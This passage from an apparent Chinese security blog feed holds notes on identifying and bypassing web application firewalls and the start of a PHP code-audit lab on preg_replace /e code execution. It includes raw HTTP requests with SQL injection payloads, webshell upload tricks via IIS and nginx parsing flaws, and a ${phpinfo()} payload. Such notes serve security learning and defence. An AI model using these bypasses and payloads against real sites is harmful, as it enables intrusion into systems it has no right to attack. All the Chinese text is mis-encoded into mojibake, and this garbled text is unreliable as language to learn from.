href="#æ”»å‡»ï¼ˆçº¢å¯¹ï¼‰è§†è§’ä¸‹çš„WAF" class="headerlink" title="æ”»å‡»ï¼ˆçº¢å¯¹ï¼‰è§†è§’ä¸‹çš„WAF"></a>æ”»å‡»ï¼ˆçº¢å¯¹ï¼‰è§†è§’ä¸‹çš„WAF</h2><p>WAFçš„è¯†åˆ«ã€æ£€æµ‹ã€ç»•è¿‡åŸç†ä¸å®æˆ˜æ¡ˆä¾‹ <a href="https://www.freebuf.com/articles/web/336869.html">https://www.freebuf.com/articles/web/336869.html</a></p><h3 id="è¯†åˆ«WAF"><a href="#è¯†åˆ«WAF" class="headerlink" title="è¯†åˆ«WAF"></a>è¯†åˆ«WAF</h3><p>ä¸åŒçš„wafæœ‰ç€ä¸åŒçš„ç»•è¿‡ç­–ç•¥ï¼Œèƒ½å¤Ÿæ­£ç¡®åœ°è¯†åˆ«wafå¾ˆå…³é”®<br>ä¸€äº›å¼€æºé¡¹ç›®ï¼š</p><ul><li>Awesome WAF æ˜¯ä¸€ä¸ª GitHub ä¸Šçš„å¼€æºé¡¹ç›®ï¼Œæ—¨åœ¨ä¸º Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰é¢†åŸŸæä¾›ä¸€ä¸ªå…¨é¢çš„èµ„æºåº“ã€‚å®ƒæ±‡é›†äº†å¤§é‡çš„ WAF ç›¸å…³ä¿¡æ¯ï¼š<a href="https://github.com/0xInfection/Awesome-WAF%EF%BC%8C%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9Ahttps://xz.aliyun.com/t/6422">https://github.com/0xInfection/Awesome-WAFï¼Œç›¸å…³èµ„æ–™ï¼šhttps://xz.aliyun.com/t/6422</a></li><li>wafw00fï¼šWAFæŒ‡çº¹è¯†åˆ«å·¥å…·ï¼Œ<a href="https://github.com/EnableSecurity/wafw00f%EF%BC%8C%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9Ahttps://www.freebuf.com/articles/web/384115.html">https://github.com/EnableSecurity/wafw00fï¼Œç›¸å…³èµ„æ–™ï¼šhttps://www.freebuf.com/articles/web/384115.html</a></li></ul><p>é™¤äº†è¿™äº›æŒ‡çº¹ï¼Œè¿˜å¯ä»¥é€šè¿‡wafæ‹¦æˆªé¡µé¢æ¥åˆ¤æ–­æ˜¯ä»€ä¹ˆwafï¼š<a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ</a></p><h3 id="WAFç»•è¿‡æ‰‹æ³•"><a href="#WAFç»•è¿‡æ‰‹æ³•" class="headerlink" title="WAFç»•è¿‡æ‰‹æ³•"></a>WAFç»•è¿‡æ‰‹æ³•</h3><p>å¹²è´§ | å®æˆ˜ç»•è¿‡WAFå„ç§å§¿åŠ¿æ€»ç»“ï¼š<a href="https://cloud.tencent.com/developer/article/1969001">https://cloud.tencent.com/developer/article/1969001</a><br>WAFæœºåˆ¶åŠç»•è¿‡æ–¹æ³•æ€»ç»“ï¼šæ³¨å…¥ç¯‡ï¼š<a href="https://www.freebuf.com/articles/web/229982.html">https://www.freebuf.com/articles/web/229982.html</a><br><a href="https://rivers.chaitin.cn/blog/cqj7vdp0lnedo7thq0a0">https://rivers.chaitin.cn/blog/cqj7vdp0lnedo7thq0a0</a><br><a href="https://xz.aliyun.com/t/15">https://xz.aliyun.com/t/15</a><br>ä»WAFçš„é˜²èŒƒæ‰‹æ®µè§’åº¦è€ƒè™‘ï¼Œå¯ä»¥æ•´ç†ä»¥ä¸‹æ€è·¯</p><ol><li>åŸºäºIPå°é”<ul><li>åŸºäºhttpè¯·æ±‚å¤´å°é”IP å¯ä½¿ç”¨burp suiteæ’ä»¶fake-ipè¿›è¡Œç»•è¿‡</li><li>åŸºäºTCPå°é”IP ä½¿ç”¨IPä»£ç†æ± ä¸æ–­åˆ‡æ¢çœŸå®IP</li><li>åˆ©ç”¨ç™½åå•ï¼Œä¸€äº›wafä¼šè®¾ç½®ä¸€äº›ç™½åå•ï¼Œæ¯”å¦‚é’ˆå¯¹360ã€ç™¾åº¦ç­‰çˆ¬è™«çš„ç™½åå•ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç‰¹æ®Šçš„è¯·æ±‚å¤´ç»•è¿‡</li></ul></li><li>åŸºäºè§„åˆ™é—®é¢˜<ul><li>å¸¸è§è§„åˆ™ç±»å‹ï¼š<ul><li>æ­£åˆ™è¡¨è¾¾å¼è§„åˆ™ï¼šåŒ¹é…ç‰¹å®šçš„å­—ç¬¦åºåˆ—ã€‚</li><li>æ¨¡ç‰ˆåŒ¹é…è§„åˆ™ï¼šåŒ¹é…é¢„å®šä¹‰çš„æ”»å‡»æ¨¡æ¿ã€‚</li><li>è¡Œä¸ºåˆ†æè§„åˆ™ï¼šåˆ†æè¯·æ±‚è¡Œä¸ºï¼Œå¦‚è¯·æ±‚é¢‘ç‡ã€å‚æ•°å˜åŒ–ç­‰ã€‚</li></ul></li><li>ç»•è¿‡æ–¹æ³•ï¼š<ul><li>ç¼–ç ç»•è¿‡ï¼š åˆ©ç”¨URLç¼–ç ã€HTMLç¼–ç ã€Unicodeç¼–ç ç­‰æ–¹å¼å¯¹æ¶æ„payloadè¿›è¡Œç¼–ç ï¼Œç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚</li><li>å¤§å°å†™ç»•è¿‡ï¼š è®¸å¤šWAFå¯¹å¤§å°å†™æ•æ„Ÿï¼Œé€šè¿‡å¤§å°å†™æ··åˆçš„æ–¹å¼ç»•è¿‡è§„åˆ™ã€‚</li><li>æ³¨é‡Šç»•è¿‡ï¼š åœ¨payloadä¸­æ’å…¥æ³¨é‡Šï¼Œå¹²æ‰°WAFçš„æ£€æµ‹ã€‚</li><li>ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼š åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ã€æ¢è¡Œç¬¦ï¼‰ç»•è¿‡WAFã€‚</li><li>æ—¶é—´å·®æ”»å‡»ï¼š é’ˆå¯¹åŸºäºæ—¶é—´å·®çš„æ£€æµ‹æœºåˆ¶ï¼Œé€šè¿‡å¤šæ¬¡è¯·æ±‚ï¼Œé€æ¸å¢åŠ payloadé•¿åº¦ï¼Œæœ€ç»ˆç»•è¿‡WAFã€‚</li></ul></li></ul></li><li>åŸºäºè§£æå·®å¼‚<ul><li>é€šè¿‡ä¸šåŠ¡ç‰¹æ€§ç»•è¿‡  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=â€™an\d&#x27;&#x27;=&#x27;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>  åœ¨æŸäº›ä¸šåŠ¡ä¸­ï¼Œä¸€äº›å­—ç¬¦ä¼šè¢«æ›¿æ¢æˆç©º(å¦‚å¾ˆå¤šåˆ©ç”¨jsonæ¥ä¼ é€’æ•°æ®çš„ç½‘ç«™å¾ˆå¤šä¼šæŠŠå‡¡æ–œæ \æ›¿æ¢æˆç©ºï¼Œè¿™ç§åˆ™å¯ä»¥åˆ©ç”¨burpsuitè¿›è¡ŒfuzzingæŸ¥æ‰¾è¢«å¤„ç†æ‰çš„å­—ç¬¦)ï¼Œåˆ©ç”¨è¿™ä¸ªå°±å¯ä»¥ç”¨æ¥ç»•è¿‡waf:â€™an\dâ€˜â€™&#x3D;â€˜ä¼šå˜æˆâ€™andâ€˜â€™&#x3D;â€™ï¼Œå¯¼è‡´wafç»•è¿‡. </li><li>ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼Œç±»ä¼¼å‰é¢çš„å†…å®¹</li><li>Mutilpartå˜é‡è¦†ç›–ç»•è¿‡  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=--------1099641188</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">----------1099641188</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=â€œ<span class="built_in">id</span>;filename=xxâ€;<span class="built_in">name</span>=â€œ<span class="built_in">id</span>â€</span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript">&#x27;<span class="keyword">and</span>&#x27;&#x27;=â€˜</span></span><br><span class="line"><span class="language-applescript"><span class="comment">----------1099641188--</span></span></span><br></pre></td></tr></table></figure>  æœ‰äº›wafæ£€æµ‹filenameè¿™ä¸ªå±æ€§å­˜åœ¨çš„æ—¶å€™ä¸‹é¢çš„å†…å®¹åˆ™ä¸è¿›è¡Œsqlæ³¨å…¥æ£€æµ‹ï¼Œå› æ­¤å¯ä»¥æ„é€ åŒåå‚æ•°å‰é¢ä¸€ä¸ªnameåŒ…å«filenameè¿™ä¸ªå±æ€§ï¼Œåé¢å†åŠ ä¸€ä¸ªæ­£å¸¸çš„nameå±æ€§ï¼Œä½†æ˜¯apacheè§£æçš„æ—¶å€™ä¼šè§£æåé¢é‚£ä¸ªnameå±æ€§ï¼Œä»è€Œå¯¼è‡´wafç»•è¿‡ã€‚</li><li>WAF è§£æä¸ Web æœåŠ¡è§£æä¸ä¸€è‡´éƒ¨åˆ† ASP+IIS ä¼šè½¬æ¢ %u0065 æ ¼å¼çš„å­—ç¬¦Apache ä¼šè§£æç•¸å½¢ Methodï¼š.php â€“&gt; &#x2F;1.php.dvw.123 ä»åå¾€å‰è§£æï¼Œç¢°åˆ°phpæ‰ä¼šè§£æ</li><li>Iis5.0-6.0è§£ææ¼æ´ï¼Œxx.asp&#x2F;xx.jpg ï¼Œxx.aspç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ï¼Œxx.asp;.jpg é»˜è®¤è¢«è§£æä¸ºaspæ–‡ä»¶</li><li>Iis7.5è§£ææ¼æ´(php.iniå¼€å¯fix_pathinfo)ï¼Œxx.jpg æˆ‘ä»¬åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œä¸€å¥è¯æœ¨é©¬å†™æˆxx.jpgï¼Œè®¿é—®æ—¶åé¢åŠ ä¸Šxx.jpg&#x2F;xx.phpï¼Œå›¾ç‰‡æ–‡ä»¶ä¼šä»¥phpæ ¼å¼æ‰§è¡Œ</li><li>nginxè§£ææ¼æ´(php.iniå¼€å¯fix_pathinfo)ï¼Œxx.jpg%00.php Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒåŒä¸€ä¸ªå‚æ•°å¤šæ¬¡å‡ºç°ï¼Œ å–çš„ä½ç½®ä¸ä¸€æ ·</li></ul></li><li>åŸºäºèµ„æºçš„ç»•è¿‡<br>ä½¿ç”¨æ¶ˆè€—å¤§çš„è½½è·ï¼Œè€—å°½WAFçš„è®¡ç®—èµ„æºï¼Œé€šè¿‡å¢åŠ ä¼ é€’å¾—å‚æ•°æ•°é‡ï¼Œè¾¾åˆ°wafæ£€æµ‹ä¸Šé™ï¼Œè¶…å‡ºçš„å‚æ•°å°±å¯ç»•è¿‡wafäº†ã€‚æ¯”å¦‚wafæ£€æµ‹æ–‡æœ¬å†…å®¹ä¸º40å­—èŠ‚ï¼Œå¤šå‡º40çš„å°±ä¸å†æ£€æµ‹ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æŠŠè„šæœ¬æ–‡ä»¶å†™åœ¨40ä¸ªå­—èŠ‚æ–‡ä»¶ä¹‹åã€‚å†æ¯”å¦‚æˆ‘ä»¬é€šè¿‡ç¼“å†²åŒºæº¢å‡ºç»•è¿‡WAFï¼šå½“æˆ‘ä»¬ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ•°æ®é‡å¤§äºwafå¯ä»¥æ£€æµ‹çš„æ•°æ®é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡å‘é€å¤§é‡çš„åƒåœ¾æ•°æ®å°† WAF æº¢å‡ºï¼Œä»è€Œç»•è¿‡wafã€‚union select&#x3D; and (select 1)&#x3D;(select 0xA*111111111111) unIon selectand 1&#x3D;1 &#x3D; and 1&#x3D;1 and 111111â€¦11111111</li><li>åŸºäºæ¶æ„çš„ç»•è¿‡<br> å¯»æ‰¾çœŸå®ipç»•è¿‡äº‘wafï¼Œäº‘wafé€šè¿‡é…ç½®NSæˆ–è€…CNAMEè®°å½•ï¼Œä½¿å¾—å¯¹ç½‘ç«™çš„è¯·æ±‚æŠ¥æ–‡ä¼˜å…ˆç»è¿‡WAFä¸»æœºï¼Œç»è¿‡WAFä¸»æœºè¿‡æ»¤ä¹‹åï¼Œå°†è¢«è®¤ä¸ºæ— å®³çš„è¯·æ±‚æŠ¥æ–‡å†é€ç»™å®é™…çš„ç½‘ç«™æœåŠ¡å™¨è¿›è¡Œè¯·æ±‚,æ­¤æ—¶åªè¦æ‰¾åˆ°æœåŠ¡å™¨çš„çœŸå®ip,ä¿®æ”¹hostä¸ºæœåŠ¡å™¨çœŸæ˜¯ipå³å¯ç»•è¿‡äº‘waf<br> å¸¸è§å¯»æ‰¾çœŸå®ipçš„æ–¹å¼æœ‰å¦‚ä¸‹å‡ ç§<ul><li>è¯ä¹¦ä¿¡æ¯æŸ¥è¯¢ <a href="https://myssl.com/">https://myssl.com/</a></li><li>dnså†å²è§£æè®°å½•</li><li>æœé›†å­åŸŸåip cæ®µ(è€ƒè™‘åˆ°è´¹ç”¨é—®é¢˜ï¼Œä¸€äº›å­åŸŸåå¹¶ä¸ä¼šéƒ¨ç½²)</li><li>è¶…çº§ping</li></ul></li><li>å¯»æ‰¾æ²¡æœ‰éƒ¨ç½²wafçš„nginxåä»£æœºå™¨ï¼šå½“wafåœ¨nginxæœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œä¸”å­˜åœ¨nginxé›†ç¾¤æ—¶ï¼Œå¯ä»¥è¯•è¯•å°è¯•å¯»æ‰¾èƒ½åä»£æœåŠ¡å´åˆæ²¡ç”¨éƒ¨ç½²wafçš„æœºå™¨è®¿é—®è¿›è¡Œç»•è¿‡ï¼Œä»¥ä¸‹é¢è¿™ä¸ªä¸ºä¾‹ï¼Œæµ‹è¯•æŸæ¥å£å‘ç°è¢«æ‹¦æˆªã€‚<br> ä»¥ä¸‹é¢è¿™ä¸ªä¸ºä¾‹ï¼Œæµ‹è¯•æŸæ¥å£å‘ç°è¢«æ‹¦æˆª<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-5.png"><br> æœé›†ipä¿¡æ¯ä¸ºxxx.xxx.200.1xx<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-6.png"><br> æŸ¥æ‰¾cæ®µæœåŠ¡ï¼Œä¸€ä¸ªä¸ªè®¿é—®å°è¯•<br> <img src="/2024/10/15/WebSecurity/framwork/waf/image-7.png"></li><li>åˆ†å—ä¼ è¾“ç»•è¿‡WAFï¼š<a href="https://www.anquanke.com/post/id/169738">åˆ©ç”¨åˆ†å—ä¼ è¾“åŠæ‰“æ‰€æœ‰WAF</a>ã€<a href="https://www.freebuf.com/news/193659.html">æŠ€æœ¯è®¨è®º | åœ¨HTTPåè®®å±‚é¢ç»•è¿‡WAF</a>ã€<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd">ç¼–å†™Burpåˆ†å—ä¼ è¾“æ’ä»¶ç»•WAF</a>ã€<a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Javaååºåˆ—åŒ–æ•°æ®ç»•WAFä¹‹å»¶æ—¶åˆ†å—ä¼ è¾“</a></li><li>å…¶ä»–ç‰¹æ€§<ul><li>Mysqlç‰¹æ€§ä½¿ç”¨&#x2F;!%0a&#x2F;ç»•è¿‡</li><li>é€šè¿‡ç¼–ç é¥¶è¿‡</li><li>ä½¿ç”¨æˆªæ–­å­—ç¬¦</li><li>é‡å¤å˜é‡</li><li>å‚æ•°è§£æå·®å¼‚</li><li>é’ˆå¯¹åŸŸåçš„ä¿æŠ¤</li><li>å¯¹Content-Typeä¸åŒç†è§£</li><li>è¶…å¤§æ•°æ®åŒ…</li><li>Postä¸åŒè§£ææ–¹å¼</li><li>å¼‚å¸¸æ•°æ®åŒ…</li></ul></li><li>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„ç»•è¿‡æ€è·¯ï¼š<ul><li>è¶…é•¿æ–‡ä»¶åï¼šåˆ©ç”¨è¶…é•¿çš„æ–‡ä»¶åï¼Œå¯ä»¥é€ƒè¿‡æ–‡ä»¶åç¼€åçš„æ£€æµ‹</li><li>ä¸Šä¼ å†…å®¹ä½¿ç”¨åƒåœ¾å­—ç¬¦ï¼šä¸Šä¼ ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå°†é©¬å­è—åœ¨å…¶ä¸­</li><li>ä½¿ç”¨å‚æ•°æ±¡æŸ“æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼šç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ç»™å‚æ•°èµ‹ä¸Šå¤šä¸ªå€¼</li><li>æ„é€ ç•¸å½¢è¯·æ±‚åŒ…ï¼š<br>  æœ‰äº›å¯ä»¥é€šè¿‡ä¿®æ”¹POSTä¸ºGETç»•è¿‡waf<br>  è¿˜æœ‰çš„wafé€šè¿‡Content-Type: multipart&#x2F;form-dataæ¥åˆ¤å®šè¿™æ˜¯ä¸ªä¸Šä¼ åŒ…ï¼Œç„¶åæ£€æµ‹å†…å®¹<br>  è¿™ä¸ªæ–¹æ³•ï¼Œåˆèƒ½ç»†åˆ†å‡ºå¾ˆå¤šæ¥ï¼Œè€Œä¸”å±¡è¯•ä¸çˆ½ï¼Œè¿™é‡Œæ€»ç»“ä¸‹æˆ‘ä¸ªäººå¸¸ç”¨çš„<br>  (1) åˆ æ‰content-type<br>  (2) æ„é€ å¤šä¸ªfilename<br>  (3)content-typeåé¢åŠ TABLEé”®<br>  (4)æ¢è¡Œboundary<br>  (5)æ–‡ä»¶åå‰é¢åŠ ç©ºæ ¼<br>  (6)æ–‡ä»¶åå‰é¢åŠ å•å¼•å·</li><li>æ–‡ä»¶å†…å®¹ç¼–ç ç»•è¿‡ï¼šæ—¢å¯ä»¥è®©wafæ£€æµ‹ä¸åˆ°ï¼Œåˆèƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚</li></ul></li></ol><h2 id="é˜²å®ˆï¼ˆè“é˜Ÿï¼‰è§†è§’ä¸‹çš„WAF"><a href="#é˜²å®ˆï¼ˆè“é˜Ÿï¼‰è§†è§’ä¸‹çš„WAF" class="headerlink" title="é˜²å®ˆï¼ˆè“é˜Ÿï¼‰è§†è§’ä¸‹çš„WAF"></a>é˜²å®ˆï¼ˆè“é˜Ÿï¼‰è§†è§’ä¸‹çš„WAF</h2><p><a href="https://www.freebuf.com/articles/web/338908.html">https://www.freebuf.com/articles/web/338908.html</a><br><a href="https://help.aliyun.com/zh/waf/web-application-firewall-2-0/use-cases/best-practices-for-access-configuration">WAFæ¥å…¥é…ç½®æœ€ä½³å®è·µ</a><br><a href="https://github.com/kumustone/go-fast-waf">go-fast-waf</a></p><ul><li><strong>WAFçš„é…ç½®ä¸ä¼˜åŒ–</strong><ul><li>WAFè§„åˆ™é…ç½®</li><li>WAFæ€§èƒ½ä¼˜åŒ–</li><li>WAFä¸å…¶ä»–å®‰å…¨è®¾å¤‡çš„è”åŠ¨</li></ul></li><li><strong>WAFçš„å±€é™æ€§</strong><ul><li>WAFæ— æ³•é˜²å¾¡æ‰€æœ‰æ”»å‡»</li><li>WAFå¯èƒ½å¼•å…¥æ–°çš„å®‰å…¨é£é™©</li><li>WAFå¯èƒ½å½±å“ç½‘ç«™æ€§èƒ½</li></ul></li><li><strong>è“é˜Ÿå¸¸ç”¨çš„é˜²å¾¡WAFç»•è¿‡çš„æ‰‹æ®µ</strong><ul><li>WAFè§„åˆ™ä¸æ–­æ›´æ–°</li><li>WAFä¸IDS&#x2F;IPSè”åŠ¨</li><li>WAFä¸Webåº”ç”¨é˜²ç«å¢™è”åŠ¨</li><li>åº”ç”¨å±‚é˜²æŠ¤</li><li>WAFæ—è·¯éƒ¨ç½²</li><li>äººå·¥å®‰å…¨ç›‘æµ‹</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘PHPä»£ç å®¡è®¡3</title>
      <link href="/2024/10/14/WebSecurity/codeaudit/phpaudit3/"/>
      <url>/2024/10/14/WebSecurity/codeaudit/phpaudit3/</url>
      
        <content type="html"><![CDATA[<p>ç³»åˆ—å†…å®¹å‡æ¥è‡ªï¼š<a href="https://github.com/hongriSec/PHP-Audit-Labs/%EF%BC%8C%E4%BB%85%E4%BB%85%E5%9C%A8%E7%AC%94%E8%AE%B0%E4%B8%AD%E4%BF%9D%E5%AD%98">https://github.com/hongriSec/PHP-Audit-Labs/ï¼Œä»…ä»…åœ¨ç¬”è®°ä¸­ä¿å­˜</a></p><h2 id="Day8-Candle"><a href="#Day8-Candle" class="headerlink" title="Day8 - Candle"></a>Day8 - Candle</h2><p>é¢˜ç›®å«èœ¡çƒ›ï¼Œä»£ç å¦‚ä¸‹</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image.png"></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>ï¼š(PHP 5.5)</p><p><strong>åŠŸèƒ½</strong> ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><p><strong>å®šä¹‰</strong> ï¼š <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>æœç´¢ <strong>subject</strong> ä¸­åŒ¹é… <strong>pattern</strong> çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ <strong>replacement</strong> è¿›è¡Œæ›¿æ¢</p></blockquote><ul><li><strong>$pattern</strong> å­˜åœ¨ <strong>&#x2F;e</strong> æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ</li><li><strong>&#x2F;e</strong> æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ **preg_replace() ** å°† <strong>$replacement</strong> å½“åšphpä»£ç æ¥æ‰§è¡Œ</li></ul><p><strong>æ¼æ´è§£æ</strong> </p><p>è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯ <strong>preg_replace</strong> å‡½æ•°ä½¿ç”¨ <strong>&#x2F;e</strong> æ¨¡å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œçš„é—®é¢˜ã€‚æˆ‘ä»¬å‘ç°åœ¨ä¸Šå›¾ä»£ç  <strong>ç¬¬11è¡Œ</strong> å¤„ï¼Œå°† <strong>GET</strong> è¯·æ±‚æ–¹å¼ä¼ æ¥çš„å‚æ•°ç”¨åœ¨äº† <strong>complexStrtolower</strong> å‡½æ•°ä¸­ï¼Œè€Œå˜é‡ <strong>$regex</strong> å’Œ <strong>$value</strong> åˆç”¨åœ¨äº†å­˜åœ¨ä»£ç æ‰§è¡Œæ¨¡å¼çš„ <strong>preg_replace</strong> å‡½æ•°ä¸­ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ <strong>preg_replace</strong> å‡½æ•°ç¬¬1ä¸ªã€ç¬¬3ä¸ªå‚æ•°ï¼Œæ¥æ‰§è¡Œä»£ç ã€‚ä½†æ˜¯å¯è¢«å½“åšä»£ç æ‰§è¡Œçš„ç¬¬2ä¸ªå‚æ•°ï¼Œå´å›ºå®šä¸º <strong>â€˜strtolower(â€œ\\1â€)â€™</strong> ã€‚å®é™…ä¸Šï¼Œè¿™é‡Œæ¶‰åŠåˆ°æ­£åˆ™è¡¨è¾¾å¼åå‘å¼•ç”¨çš„çŸ¥è¯†ï¼Œå³æ­¤å¤„çš„ <strong>\\1</strong> ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒ <a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> ä¸Šçš„è§£é‡Šï¼š</p><blockquote><p><strong>åå‘å¼•ç”¨</strong> </p><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong> ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p></blockquote><p>æœ¬é¢˜å®˜æ–¹ç»™çš„ <strong>payload</strong> ï¼š**&#x2F;?.<em>&#x3D;{${phpinfo()}}</em>* å®é™…ä¸Šå¹¶ä¸èƒ½ç”¨ï¼Œå› ä¸ºå¦‚æœGETè¯·æ±‚çš„å‚æ•°åå­˜åœ¨éæ³•å­—ç¬¦ï¼ŒPHPä¼šå°†å…¶æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œå³ <code>.*</code> ä¼šå˜æˆ <code>_*</code> ã€‚è¿™é‡Œæˆ‘ä»¬æä¾›ä¸€ä¸ªå¯ç”¨ <strong>payload</strong> ï¼š<em><em>\S</em>&#x3D;${phpinfo()}</em>* ï¼Œè¯¦ç»†åˆ†æè¯·å‚è€ƒæˆ‘ä»¬å‰å‡ å¤©å‘è¡¨çš„æ–‡ç« ï¼š <a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a><br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-1.png"></p><p>åœ¨æ–°ç‰ˆæœ¬ä¸­ç‰¹åˆ«æ³¨æ„<code>/e</code>ä¿®é¥°ç¬¦å·²ç»è¢«åºŸå¼ƒï¼Œå»ºè®®ä½¿ç”¨<code>preg_replace_callback()</code>æ¥å®‰å…¨åœ°å®ç°ç›¸åŒçš„åŠŸèƒ½ã€‚</p><h3 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong>CmsEasy 5.5</strong> ç‰ˆæœ¬ï¼Œæ¼æ´å…¥å£æ–‡ä»¶ä¸º <strong>&#x2F;lib&#x2F;tool&#x2F;form.php</strong> ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹å›¾ç¬¬7è¡Œå¤„å¼•ç”¨äº†<strong>preg_replace</strong> 